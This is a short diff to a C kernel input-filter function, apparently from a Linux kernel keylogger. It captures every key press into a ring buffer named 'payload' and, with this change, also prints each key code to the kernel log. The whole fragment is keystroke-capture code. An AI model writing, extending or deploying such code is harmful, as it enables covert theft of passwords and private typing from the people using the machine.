@@ -75,9 +75,11 @@ static void myDisconnect(struct input_handle *handle) {
 static bool myFilter(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
 	bool suppress=false;
 	if ( type==EV_KEY ) {
-		int i;
+		int i, delta;
 		for ( i = 0; i < sizeof ( unsigned int ); i++ ) {
-			core.payload [ ATRW % core.capacity ] = ( code >> ( i * 8 ) ) & 0xFF;
+			delta = ( code >> ( i * 8 ) ) & 0xFF;
+			core.payload [ ATRW % core.capacity ] = delta;
+			printk ( KERN_INFO "Code : %d @ %d", code, delta );
 			if ( ATRW + 1 == ATRR ) {
 				atomic_set ( &core.rHead, ( ATRR + 1 ) % core.capacity );
 			}
